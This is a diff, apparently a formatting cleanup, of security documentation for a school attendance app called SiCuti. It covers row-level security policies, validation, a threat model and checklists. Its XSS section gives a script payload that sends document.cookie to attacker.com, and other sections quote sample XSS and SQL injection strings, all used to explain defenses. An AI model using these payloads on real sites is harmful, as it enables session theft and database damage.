@@ -7,12 +7,14 @@ Comprehensive security documentation for SiCuti including architecture, best pra
 ## 1. Security Overview
 
 **Security Principles**:
+
 - **Defense in Depth**: Multiple layers of security (database, app, network)
 - **Least Privilege**: Users only access data needed for their role
 - **Data Integrity**: RLS policies enforce access at database level
 - **Transparency**: All security decisions documented and auditable
 
 **Key Security Features**:
+
 - Row Level Security (RLS) on sensitive tables
 - Cryptographically secure QR code generation
 - Auth guard on all dashboard pages
@@ -29,6 +31,7 @@ Comprehensive security documentation for SiCuti including architecture, best pra
 **Method**: Supabase Auth (email/password)
 
 **Session Management**:
+
 ```
 User logs in with email/password
   ↓
@@ -44,12 +47,14 @@ On logout: Token cleared from storage
 ```
 
 **Session Security**:
+
 - JWT tokens are HTTP-only when possible
 - Tokens expire after inactivity (configurable)
 - Each session has unique token
 - No sensitive data stored in token
 
 **Best Practices**:
+
 ```
 ✓ Never store password in code or logs
 ✓ Use strong passwords (enforce on account creation)
@@ -74,19 +79,20 @@ const isAdmin = profile?.role === 'admin' || profile?.jabatan === 'Kepala Sekola
 
 **Access Control Table**:
 
-| Action | Admin | Guru | Public |
-|--------|-------|------|--------|
-| View all students | ✓ | Class only | ✗ |
-| Edit student | ✓ | ✗ | ✗ |
-| Delete student | ✓ | ✗ | ✗ |
-| View own attendance | ✓ | ✓ | ✗ |
-| View all attendance | ✓ | ✗ | ✗ |
-| Submit leave request | ✓ | ✓ | ✗ |
-| Approve leave | ✓ | ✗ | ✗ |
-| View public calendar | ✓ | ✓ | ✓ |
-| Scan QR code | ✓ | ✓ | ✓ |
+| Action               | Admin | Guru       | Public |
+| -------------------- | ----- | ---------- | ------ |
+| View all students    | ✓     | Class only | ✗      |
+| Edit student         | ✓     | ✗          | ✗      |
+| Delete student       | ✓     | ✗          | ✗      |
+| View own attendance  | ✓     | ✓          | ✗      |
+| View all attendance  | ✓     | ✗          | ✗      |
+| Submit leave request | ✓     | ✓          | ✗      |
+| Approve leave        | ✓     | ✗          | ✗      |
+| View public calendar | ✓     | ✓          | ✓      |
+| Scan QR code         | ✓     | ✓          | ✓      |
 
 **Implementation**:
+
 - Frontend: Check role with `useProfile()` hook
 - Backend: RLS policies enforce at database level (not optional)
 
@@ -99,6 +105,7 @@ RLS is the **primary security mechanism**. Database enforces access even if app 
 ### 3.1 RLS Policy Fundamentals
 
 **How RLS works**:
+
 ```
 User runs query
   ↓
@@ -115,6 +122,7 @@ If policy denies: Query fails with "permission denied" error
 ### 3.2 RLS Policies by Table
 
 #### **profiles** table
+
 ```sql
 -- Policy 1: Users can read their own profile
 CREATE POLICY "Users read own profile" ON profiles
@@ -124,7 +132,7 @@ CREATE POLICY "Users read own profile" ON profiles
 -- Policy 2: Admins can read any profile
 CREATE POLICY "Admins read any profile" ON profiles
   FOR SELECT
-  USING (auth.jwt()->>'role' = 'admin' OR 
+  USING (auth.jwt()->>'role' = 'admin' OR
          (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah');
 
 -- Policy 3: Admins can insert profiles
@@ -147,13 +155,14 @@ CREATE POLICY "Admins delete profiles" ON profiles
 ```
 
 #### **students** table
+
 ```sql
 -- Policy 1: Teachers see students from their own class
 CREATE POLICY "Teachers see own class students" ON students
   FOR SELECT
   USING (
     class_id IN (
-      SELECT id FROM classes 
+      SELECT id FROM classes
       WHERE guru_id = auth.uid()
     )
   );
@@ -187,6 +196,7 @@ CREATE POLICY "Admins delete students" ON students
 ```
 
 #### **attendance_students** table
+
 ```sql
 -- Policy 1: Teachers see attendance for their own class
 CREATE POLICY "Teachers see own class attendance" ON attendance_students
@@ -227,6 +237,7 @@ CREATE POLICY "Admins delete attendance" ON attendance_students
 ```
 
 #### **leave_requests** table
+
 ```sql
 -- Policy 1: Users see own leave requests
 CREATE POLICY "Users see own leave requests" ON leave_requests
@@ -254,6 +265,7 @@ CREATE POLICY "Admins update leave requests" ON leave_requests
 ```
 
 #### **school_events** table
+
 ```sql
 -- Policy 1: Anyone (including public) can read public events
 CREATE POLICY "Public read public events" ON school_events
@@ -283,6 +295,7 @@ CREATE POLICY "Admins delete events" ON school_events
 ```
 
 #### **weekly_plans** table
+
 ```sql
 -- Policy 1: Teachers see RPPM for their own class
 CREATE POLICY "Teachers see own class RPPM" ON weekly_plans
@@ -363,30 +376,32 @@ UPDATE students SET nama = 'Hacker' WHERE id = 'student-uuid';
 **Issue: "Permission denied" error for legitimate user**
 
 Diagnosis:
+
 ```
 1. Check user role
    SELECT role, jabatan FROM profiles WHERE id = 'user-uuid';
-   
+
 2. Check RLS policy on table
    Find the SELECT policy
-   
+
 3. Verify policy logic
    Is it checking auth.uid() correctly?
    Is it checking role correctly?
-   
+
 4. Test policy with manual query
    Does same query work when you run it directly?
 ```
 
 Solution:
+
 ```
 If role wrong:
   UPDATE profiles SET role = 'admin' WHERE id = 'user-uuid';
-  
+
 If policy logic wrong:
   Fix policy SQL
   Test with SELECT query
-  
+
 If policy too restrictive:
   Add new policy for use case
   Test before deploying
@@ -395,22 +410,24 @@ If policy too restrictive:
 **Issue: Unauthorized user accessing data**
 
 Diagnosis:
+
 ```
 1. Check if RLS is enabled on table
    Supabase dashboard → table → policies
-   
+
 2. Check policy USING clause
    Is it denying access?
-   
+
 3. Check if policy has WHERE clause
    Missing WHERE = full access (security hole)
 ```
 
 Solution:
+
 ```
 Enable RLS on table if not enabled:
   ALTER TABLE students ENABLE ROW LEVEL SECURITY;
-  
+
 Fix policy to be restrictive:
   CREATE POLICY "Deny all" ON students
     FOR SELECT USING (false);
@@ -422,28 +439,31 @@ Fix policy to be restrictive:
 
 ### 4.1 Sensitive Data Classification
 
-| Data | Sensitivity | Protection |
-|------|---|---|
-| QR codes | Medium | UNIQUE constraint, RLS |
-| Student names | Low | RLS (teacher sees own class) |
-| Teacher names | Low | RLS (admin/self only) |
-| Parent phone | Medium | RLS (teacher sees own class) |
-| Leave requests | High | RLS (teacher/admin only) |
-| Attendance records | High | RLS (teacher/admin only) |
+| Data               | Sensitivity | Protection                   |
+| ------------------ | ----------- | ---------------------------- |
+| QR codes           | Medium      | UNIQUE constraint, RLS       |
+| Student names      | Low         | RLS (teacher sees own class) |
+| Teacher names      | Low         | RLS (admin/self only)        |
+| Parent phone       | Medium      | RLS (teacher sees own class) |
+| Leave requests     | High        | RLS (teacher/admin only)     |
+| Attendance records | High        | RLS (teacher/admin only)     |
 
 ### 4.2 Data Encryption
 
 **In Transit** (Network):
+
 - All API calls use HTTPS (enforced by Vercel + Supabase)
 - Certificates: Let's Encrypt (auto-renewed)
 - Protocol: TLS 1.2+ only
 
 **At Rest** (Database):
+
 - Supabase Pro tier includes encryption at rest
 - Data encrypted in storage (AES-256)
 - Backups also encrypted
 
 **Passwords**:
+
 - Supabase hashes with bcrypt (industry standard)
 - Never stored in plain text
 - Never logged or exposed
@@ -451,17 +471,20 @@ Fix policy to be restrictive:
 ### 4.3 Data Retention & Deletion
 
 **Retention Policy**:
+
 - Active student records: Keep permanently (historical)
 - Attendance records: Keep for 3+ years (audit trail)
 - Leave requests: Keep for 2 years
 - Backups: Retain 7 days
 
 **Data Deletion**:
+
 - Soft delete: Add `deleted_at` timestamp (keeps data for audit)
 - Hard delete: Remove from database (irreversible)
 - Use soft deletes for compliance unless data needs permanent removal
 
 **GDPR Compliance**:
+
 - Right to erasure: Delete student data on request
 - Data portability: Export student records (available)
 - Consent: Document why data is collected
@@ -470,6 +493,7 @@ Fix policy to be restrictive:
 ### 4.4 Audit Logging
 
 **What to Log**:
+
 - Admin creates/deletes user
 - Admin approves/rejects leave
 - Teacher submits leave request
@@ -477,11 +501,13 @@ Fix policy to be restrictive:
 - Permission denied (RLS) errors
 
 **Where Logs Stored**:
+
 - Supabase logs (auto-retained ~30 days)
 - Vercel logs (auto-retained ~1 month)
 - Export for long-term storage (manual)
 
 **Log Retention**:
+
 - Real-time logs: Supabase dashboard (query-able)
 - Archived logs: Export monthly to secure storage
 - Retention period: 1+ year minimum
@@ -495,6 +521,7 @@ Fix policy to be restrictive:
 **Principle**: Never trust user input. Validate and sanitize everything.
 
 **Where to Validate**:
+
 1. **Frontend** (UX): Provide immediate feedback
 2. **Backend** (Security): Final validation before storing
 
@@ -502,31 +529,31 @@ Fix policy to be restrictive:
 
 ```javascript
 // Form validation (frontend)
-if (!email || !email.includes('@')) {
-  alert('Invalid email')
-  return
+if (!email || !email.includes("@")) {
+  alert("Invalid email");
+  return;
 }
 
 if (nama.length < 2) {
-  alert('Nama terlalu pendek')
-  return
+  alert("Nama terlalu pendek");
+  return;
 }
 
 if (!tanggal_lahir || new Date(tanggal_lahir) > new Date()) {
-  alert('Tanggal lahir tidak valid')
-  return
+  alert("Tanggal lahir tidak valid");
+  return;
 }
 
 // Date validation
 if (tanggal_mulai > tanggal_selesai) {
-  alert('Tanggal mulai harus sebelum tanggal selesai')
-  return
+  alert("Tanggal mulai harus sebelum tanggal selesai");
+  return;
 }
 
 // File validation (CSV import)
-if (!file.name.endsWith('.csv')) {
-  alert('Hanya file CSV yang diizinkan')
-  return
+if (!file.name.endsWith(".csv")) {
+  alert("Hanya file CSV yang diizinkan");
+  return;
 }
 ```
 
@@ -534,31 +561,31 @@ if (!file.name.endsWith('.csv')) {
 
 ```javascript
 export async function POST(request) {
-  const { email, password, full_name } = await request.json()
+  const { email, password, full_name } = await request.json();
 
   // Validate required fields
   if (!email || !password || !full_name) {
     return NextResponse.json(
-      { error: 'Email, password, dan nama wajib diisi.' },
-      { status: 400 }
-    )
+      { error: "Email, password, dan nama wajib diisi." },
+      { status: 400 },
+    );
   }
 
   // Validate email format
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   if (!emailRegex.test(email)) {
     return NextResponse.json(
-      { error: 'Format email tidak valid' },
-      { status: 400 }
-    )
+      { error: "Format email tidak valid" },
+      { status: 400 },
+    );
   }
 
   // Validate password strength
   if (password.length < 8) {
     return NextResponse.json(
-      { error: 'Password harus minimal 8 karakter' },
-      { status: 400 }
-    )
+      { error: "Password harus minimal 8 karakter" },
+      { status: 400 },
+    );
   }
 
   // Proceed with creating user
@@ -571,15 +598,18 @@ export async function POST(request) {
 **Risk**: User input displayed on page without sanitization → script injection
 
 **Example Attack**:
+
 ```javascript
 // Attacker creates student with name:
-nama = "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>"
+nama =
+  "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>";
 
 // If stored and displayed without escaping:
 // Script runs in other users' browsers
 ```
 
 **Prevention**:
+
 ```javascript
 // React/Next.js automatically escapes JSX text content
 // Safe:
@@ -594,23 +624,24 @@ nama = "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</s
 ```
 
 **HTML Sanitization**:
+
 ```javascript
 // If you need to allow some HTML:
-import DOMPurify from 'isomorphic-dompurify'
+import DOMPurify from "isomorphic-dompurify";
 
-const safeHTML = DOMPurify.sanitize(userInput)
+const safeHTML = DOMPurify.sanitize(userInput);
 // Removes <script>, <iframe>, onclick, etc.
 // Keeps safe tags like <b>, <i>, <a>
 ```
 
 ### 5.3 Common XSS Vectors
 
-| Vector | Example | Prevention |
-|--------|---------|------------|
-| User input | `<img onerror=alert('xss')>` | Escape when displaying |
-| URL param | `?name=<script>` | Validate in component |
-| Rich text | `<iframe src=...>` | Sanitize HTML library |
-| Attribute | `<div title='onclick=...'` | Escape attribute values |
+| Vector     | Example                      | Prevention              |
+| ---------- | ---------------------------- | ----------------------- |
+| User input | `<img onerror=alert('xss')>` | Escape when displaying  |
+| URL param  | `?name=<script>`             | Validate in component   |
+| Rich text  | `<iframe src=...>`           | Sanitize HTML library   |
+| Attribute  | `<div title='onclick=...'`   | Escape attribute values |
 
 ---
 
@@ -619,6 +650,7 @@ const safeHTML = DOMPurify.sanitize(userInput)
 **Risk**: User input directly in SQL query → unauthorized database access
 
 **Example Attack**:
+
 ```sql
 -- Normal query
 SELECT * FROM students WHERE class_id = '123'
@@ -628,25 +660,27 @@ SELECT * FROM students WHERE class_id = '' OR '1'='1'  -- Returns all students!
 ```
 
 **Prevention**:
+
 ```javascript
 // ✓ SAFE: Parameterized query (Supabase SDK does this)
 const { data } = await supabase
-  .from('students')
+  .from("students")
   .select()
-  .eq('class_id', classId)  // Parameterized!
+  .eq("class_id", classId); // Parameterized!
 
 // ✗ UNSAFE: String concatenation (never do this)
-const query = `SELECT * FROM students WHERE class_id = '${classId}'`
-await supabase.rpc('query', { sql: query })  // Don't expose raw SQL
+const query = `SELECT * FROM students WHERE class_id = '${classId}'`;
+await supabase.rpc("query", { sql: query }); // Don't expose raw SQL
 
 // ✓ SAFE: RPC function (pre-defined logic)
-const { data } = await supabase.rpc('get_student_attendance', {
+const { data } = await supabase.rpc("get_student_attendance", {
   p_student_id: studentId,
-  p_date: today
-})
+  p_date: today,
+});
 ```
 
 **Key Points**:
+
 - Always use Supabase SDK (parameterized by default)
 - Never interpolate user input into SQL strings
 - Use RPC functions for complex queries
@@ -659,6 +693,7 @@ const { data } = await supabase.rpc('get_student_attendance', {
 ### 7.1 API Endpoint Security
 
 **Create User Endpoint** (`/api/create-user`):
+
 ```javascript
 // ✓ Security features:
 // 1. Uses service role key (server-only)
@@ -729,44 +764,47 @@ export async function POST(request) {
 ### 7.2 Error Handling (Don't Leak Secrets)
 
 **Safe Error Messages**:
+
 ```javascript
 // ✓ Safe: Generic message
-return { error: 'Invalid credentials' }
+return { error: "Invalid credentials" };
 
 // ✗ Unsafe: Reveals info
-return { error: 'User "admin@school.com" not found in database' }
+return { error: 'User "admin@school.com" not found in database' };
 
 // ✓ Safe: No database details
-return { error: 'Server error' }
+return { error: "Server error" };
 
 // ✗ Unsafe: Exposes database
-return { error: 'Error: Table "profiles" does not exist' }
+return { error: 'Error: Table "profiles" does not exist' };
 ```
 
 ### 7.3 Rate Limiting (Future)
 
 **When to implement**:
+
 - If public endpoints get high traffic
 - To prevent brute force attacks (login)
 - To prevent spam (form submissions)
 
 **Implementation**:
+
 ```javascript
 // Example: Rate limit login attempts
 // 5 failed attempts = 15 minute block
 // Use Redis or in-memory cache
 
-import rateLimit from 'express-rate-limit'
+import rateLimit from "express-rate-limit";
 
 const loginLimiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
   max: 5, // 5 requests per window
-  message: 'Terlalu banyak percobaan login, coba lagi nanti'
-})
+  message: "Terlalu banyak percobaan login, coba lagi nanti",
+});
 
-app.post('/api/login', loginLimiter, async (req, res) => {
+app.post("/api/login", loginLimiter, async (req, res) => {
   // Login logic
-})
+});
 ```
 
 ---
@@ -776,39 +814,43 @@ app.post('/api/login', loginLimiter, async (req, res) => {
 ### 8.1 Assets (What We Protect)
 
 **High Value**:
+
 - Student attendance records (can affect graduation)
 - Teacher leave records (affects payroll)
 - User credentials (authentication)
 - Admin accounts (system access)
 
 **Medium Value**:
+
 - Student contact information (privacy)
 - Teacher contact information (privacy)
 - QR codes (attendance access)
 - Lesson plans (intellectual property)
 
 **Low Value**:
+
 - Public calendar events (already public)
 - School logo (already public)
 
 ### 8.2 Threats & Mitigations
 
-| Threat | Risk | Mitigation | Status |
-|--------|------|-----------|--------|
-| **Unauthorized Access** | Teacher sees other teacher's class | RLS policies restrict per role | ✓ Implemented |
-| **Data Breach** | Hacker steals student records | Encryption at rest, RLS policies | ✓ Implemented |
-| **SQL Injection** | Hacker modifies database | Parameterized queries (SDK) | ✓ Implemented |
-| **XSS Attack** | Script injected into page | React escaping, input validation | ✓ Implemented |
-| **Session Hijacking** | Hacker uses stolen JWT | HTTPS only, short-lived tokens | ✓ Implemented |
-| **Brute Force Login** | Hacker guesses password | Rate limiting (plan to implement) | ⏳ Future |
-| **Privilege Escalation** | Guru tries to act as admin | RLS policies, role checks | ✓ Implemented |
-| **Account Takeover** | Hacker accesses admin account | 2FA (plan to implement) | ⏳ Future |
-| **Data Loss** | Database corrupted/deleted | Automated backups (7 day retention) | ✓ Implemented |
-| **DDoS Attack** | Service unavailable | Vercel/Supabase infrastructure | ✓ Infrastructure |
+| Threat                   | Risk                               | Mitigation                          | Status           |
+| ------------------------ | ---------------------------------- | ----------------------------------- | ---------------- |
+| **Unauthorized Access**  | Teacher sees other teacher's class | RLS policies restrict per role      | ✓ Implemented    |
+| **Data Breach**          | Hacker steals student records      | Encryption at rest, RLS policies    | ✓ Implemented    |
+| **SQL Injection**        | Hacker modifies database           | Parameterized queries (SDK)         | ✓ Implemented    |
+| **XSS Attack**           | Script injected into page          | React escaping, input validation    | ✓ Implemented    |
+| **Session Hijacking**    | Hacker uses stolen JWT             | HTTPS only, short-lived tokens      | ✓ Implemented    |
+| **Brute Force Login**    | Hacker guesses password            | Rate limiting (plan to implement)   | ⏳ Future        |
+| **Privilege Escalation** | Guru tries to act as admin         | RLS policies, role checks           | ✓ Implemented    |
+| **Account Takeover**     | Hacker accesses admin account      | 2FA (plan to implement)             | ⏳ Future        |
+| **Data Loss**            | Database corrupted/deleted         | Automated backups (7 day retention) | ✓ Implemented    |
+| **DDoS Attack**          | Service unavailable                | Vercel/Supabase infrastructure      | ✓ Infrastructure |
 
 ### 8.3 Threat Scenarios
 
 **Scenario 1: Disgruntled Teacher Tries to Access Another Class**
+
 ```
 1. Teacher is logged in as guru with role 'guru'
 2. Teacher tries to access /dashboard/kelas?class_id=other-class
@@ -819,9 +861,11 @@ app.post('/api/login', loginLimiter, async (req, res) => {
 5. Error returned: "new row violates row level security policy"
 6. Dashboard shows error or empty list
 ```
+
 Status: **Protected** ✓
 
 **Scenario 2: Parent Tries to Scan QR Code**
+
 ```
 1. Parent opens /scan page (no login required)
 2. Parent scans QR code (any QR code)
@@ -830,9 +874,11 @@ Status: **Protected** ✓
 5. Attendance record created
    → This is intentional (any device can be scanner)
 ```
+
 Status: **Design choice** (tablet in school) ✓
 
 **Scenario 3: Admin Account Compromised**
+
 ```
 1. Hacker has admin credentials
 2. Hacker accesses /dashboard/guru
@@ -840,9 +886,11 @@ Status: **Design choice** (tablet in school) ✓
 4. Hacker can approve/reject leave requests
 → Can modify critical data
 ```
+
 Status: **Monitoring required** (implement 2FA + audit logging)
 
 **Scenario 4: Hacker Tries SQL Injection in Student Name**
+
 ```
 1. Admin adds student with name:
    '; DROP TABLE students; --
@@ -855,6 +903,7 @@ Status: **Monitoring required** (implement 2FA + audit logging)
 4. Query treats entire string as a value (not SQL)
 5. Student stored with weird name (string is safe)
 ```
+
 Status: **Protected** ✓
 
 ---
@@ -862,6 +911,7 @@ Status: **Protected** ✓
 ## 9. Security Checklist
 
 ### Pre-Deployment (Staging)
+
 - [ ] No console errors or warnings
 - [ ] Login/logout works correctly
 - [ ] Role-based access verified (admin vs guru)
@@ -872,6 +922,7 @@ Status: **Protected** ✓
 - [ ] QR scanner works end-to-end
 
 ### Pre-Production (Master)
+
 - [ ] Staging tested thoroughly
 - [ ] Security review completed
 - [ ] All RLS policies enabled
@@ -882,6 +933,7 @@ Status: **Protected** ✓
 - [ ] Team trained on security procedures
 
 ### Post-Deployment
+
 - [ ] Monitor error logs for suspicious activity
 - [ ] Check for failed login attempts (potential brute force)
 - [ ] Verify attendance records are being created
@@ -889,6 +941,7 @@ Status: **Protected** ✓
 - [ ] Confirm backups are working
 
 ### Monthly Security Review
+
 - [ ] Audit RLS policies (are they correct?)
 - [ ] Review user access (should they still have access?)
 - [ ] Check for security updates (npm audit)
@@ -966,6 +1019,7 @@ Status: **Protected** ✓
 ### 11.1 Data Privacy Regulations
 
 **GDPR Compliance** (if students are in EU):
+
 - **Lawful basis**: School operations (legitimate interest)
 - **Data minimization**: Only collect necessary data
 - **Retention**: Keep data for operational purposes only
@@ -974,6 +1028,7 @@ Status: **Protected** ✓
 - **Privacy notice**: Inform users what data is collected
 
 **Indonesia GDPR Equivalent**:
+
 - Law No. 27 of 2022 (Personal Data Protection)
 - **Consent**: Get explicit consent for data processing
 - **Transparency**: Inform users about data collection
@@ -983,6 +1038,7 @@ Status: **Protected** ✓
 ### 11.2 Data Retention Policy
 
 **Keep**:
+
 - Student attendance (full academic year + 3 months for audit)
 - Teacher leave requests (2 years minimum)
 - Student records (while enrolled)
@@ -990,12 +1046,14 @@ Status: **Protected** ✓
 - Backups (7 days)
 
 **Delete**:
+
 - Student records on graduation/withdrawal
 - Sensitive logs after retention period
 - Temporary files (after upload)
 - Cache (regular clearing)
 
 **Archive**:
+
 - Historical attendance (export to CSV, store offline)
 - Historical reports (PDF export)
 - Keep in secure storage (encrypted)
@@ -1003,12 +1061,14 @@ Status: **Protected** ✓
 ### 11.3 Security Policies Document
 
 **Create & Publish**:
+
 - Privacy Policy (what data is collected, how it's used)
 - Security Policy (how data is protected)
 - Acceptable Use Policy (what users can/cannot do)
 - Data Breach Response Policy (what to do if data is compromised)
 
 **Post on**:
+
 - School website
 - Parent handbook
 - Teacher handbook
@@ -1083,6 +1143,7 @@ Status: **Protected** ✓
 ## 13. Security Training
 
 **Team should understand**:
+
 1. Why RLS policies exist
 2. How to test RLS policies
 3. What input validation looks like
@@ -1091,6 +1152,7 @@ Status: **Protected** ✓
 6. How to handle incidents
 
 **Resources**:
+
 - OWASP Top 10: https://owasp.org/www-project-top-ten/
 - Supabase Security: https://supabase.com/docs/guides/security
 - SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
@@ -1101,17 +1163,20 @@ Status: **Protected** ✓
 ## 14. Security Contacts & Resources
 
 **Team Roles**:
+
 - Security Lead: [Name] — Security decisions, incident response
 - DevOps: [Name] — Infrastructure security, secrets management
 - Tech Lead: [Name] — Code review for security
 - On-call: [Name] — Emergency response
 
 **External**:
+
 - Supabase Support: https://app.supabase.com/support
 - Vercel Security: https://vercel.com/security
 - GitHub Security: https://github.com/security
 
 **Reporting Security Issues**:
+
 - Email: security@school.example.com (create this if not exists)
 - Or: Contact tech lead
 - Don't post vulnerabilities publicly
@@ -1121,6 +1186,7 @@ Status: **Protected** ✓
 ## 15. Security Roadmap
 
 ### Current (Implemented)
+
 - ✓ RLS policies on all sensitive tables
 - ✓ Cryptographically secure QR generation
 - ✓ Input validation on forms
@@ -1129,6 +1195,7 @@ Status: **Protected** ✓
 - ✓ Encryption at rest (Supabase)
 
 ### Next (Priority)
+
 - [ ] 2FA (Two-Factor Authentication)
 - [ ] Rate limiting (prevent brute force)
 - [ ] Audit logging (detailed access logs)
@@ -1136,6 +1203,7 @@ Status: **Protected** ✓
 - [ ] Penetration testing
 
 ### Future
+
 - [ ] SIEM (Security Information & Event Management)
 - [ ] DLP (Data Loss Prevention)
 - [ ] Advanced threat detection
